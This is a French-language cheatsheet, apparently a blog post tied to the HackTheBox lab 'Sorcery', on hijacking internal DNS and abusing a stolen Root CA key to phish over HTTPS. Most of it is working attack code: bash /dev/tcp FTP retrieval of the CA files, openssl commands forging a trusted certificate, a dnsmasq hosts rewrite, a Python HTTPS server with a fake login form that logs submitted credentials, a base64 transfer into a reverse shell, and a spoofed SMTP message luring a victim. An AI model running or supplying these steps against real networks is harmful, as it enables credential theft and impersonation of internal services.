---
title: "DNS Hijack & SSL Phishing Attack"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Si on contrôle le DNS interne ET la clé privée du Root CA de l'organisation, on peut intercepter/usurper n'importe quel sous-domaine en HTTPS de manière 'légitime' aux yeux des clients internes."
summary: "WebAttacks | DNS Hijack & SSL Phishing Attack"
tags:
  - "Web"
  - "OWASP"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "WebAttacks"
ShowToc: true
TocOpen: false

cover:
  image: /images/covers/cheatsheet.svg
  alt: "cheatsheet"
  relative: false
---

## Concept
Si on contrôle le DNS interne ET la clé privée du Root CA de l'organisation, on peut intercepter/usurper n'importe quel sous-domaine en HTTPS de manière "légitime" aux yeux des clients internes.

## Prérequis
- Accès au serveur DNS (dnsmasq, BIND, etc.) pour modifier les entrées
- Clé privée du Root CA (souvent stockée sur un FTP, NFS, ou dans un repo)
- Un bot/utilisateur qui vérifie les certificats avec ce CA

## Étapes

### 1. Récupérer le vrai CA cert + clé
Le cert ET la clé doivent être les **originaux**. Régénérer un CA cert avec la même clé produit un fingerprint différent → rejet.

```bash
# Depuis un container/machine interne vers le FTP
# Si pas de curl/wget, FTP en bash pur:
exec 3<>/dev/tcp/ftp/21; read -r b <&3
echo -e "USER anonymous\r" >&3; read -r r <&3
echo -e "PASS x\r" >&3; read -r r <&3
echo -e "EPSV\r" >&3; read -r r <&3; echo "$r"
# → 229 Entering Extended Passive Mode (|||PORT|)
exec 4<>/dev/tcp/ftp/$PORT
echo -e "RETR pub/RootCA.crt\r" >&3; cat <&4 > /tmp/RootCA.crt
exec 4>&-; echo -e "QUIT\r" >&3; exec 3>&-
```

### 2. Générer un cert signé par le CA
```bash
# Décrypter la clé si chiffrée
openssl rsa -in RootCA.key -out RootCA_dec.key -passin pass:PASSWORD

# CSR avec SAN (obligatoire pour les clients TLS modernes)
openssl req -newkey rsa:2048 -nodes -keyout target.key -out target.csr \
  -subj "/CN=target.domain.htb" \
  -addext "subjectAltName=DNS:target.domain.htb"

# Signer avec le CA
openssl x509 -req -in target.csr -CA RootCA.crt -CAkey RootCA_dec.key \
  -CAcreateserial -out target.crt -days 365 -copy_extensions copyall

# Chaîne complète (cert + CA)
cat target.crt RootCA.crt > chain.crt

# Vérifier
openssl verify -CAfile RootCA.crt target.crt  # → OK
```

### 3. DNS hijack
```bash
echo "<MON_IP> target.domain.htb" > /dns/hosts-user  # dnsmasq
kill -HUP $(pidof dnsmasq)
```

### 4. Serveur HTTPS
```python
import ssl, http.server
class H(http.server.BaseHTTPRequestHandler):
    def log(self):
        l = int(self.headers.get("Content-Length", 0))
        b = self.rfile.read(l) if l else b""
        msg = self.command + " " + self.path + " " + b.decode() + chr(10)
        open("/tmp/all.log", "a").write(msg)
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<form method=POST action=/user/login><input id=user_name name=user_name><input id=password name=password type=password><button>Sign In</button></form>")
    do_GET = do_POST = do_PUT = log
c = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
c.load_cert_chain("/tmp/chain.crt", "/tmp/target.key")
s = http.server.HTTPServer(("0.0.0.0", 443), H)
s.socket = c.wrap_socket(s.socket, server_side=True)
s.serve_forever()
```

Si dans un reverse shell, transférer via **base64** pour préserver l'indentation:
```bash
# Sur l'attaquant
python3 -c "import base64; code=open('server.py','rb').read(); print(base64.b64encode(code).decode())"
# Dans le shell cible
echo "<B64>" | base64 -d > /tmp/s.py && python3 /tmp/s.py &
```

### 5. Trigger (email, etc.)
```bash
{
echo -e "EHLO domain.htb\r"; sleep 0.3
echo -e "MAIL FROM:<admin@domain.htb>\r"; sleep 0.3
echo -e "RCPT TO:<victim@domain.htb>\r"; sleep 0.3
echo -e "DATA\r"; sleep 0.3
echo -e "Subject: Alert\r\n\r"
echo -e "https://target.domain.htb/user/login\r\n.\r"; sleep 0.3
echo -e "QUIT\r"
} > /dev/tcp/mail/1025
```

## Pièges
- **Cert régénéré ≠ original**: Même clé privée + nouveau `openssl req -x509` = fingerprint différent
- **SAN manquant**: Les clients TLS modernes vérifient le SAN, pas le CN
- **Chaîne incomplète**: Servir cert + CA dans la chaîne TLS
- **openssl s_server**: Ne gère pas bien HTTP, utiliser Python
- **FTP passif via tunnel**: Le data port aléatoire n'est pas tunnelé → FTP depuis la machine interne directement

## Ref
- Machine: Sorcery (HTB Insane)
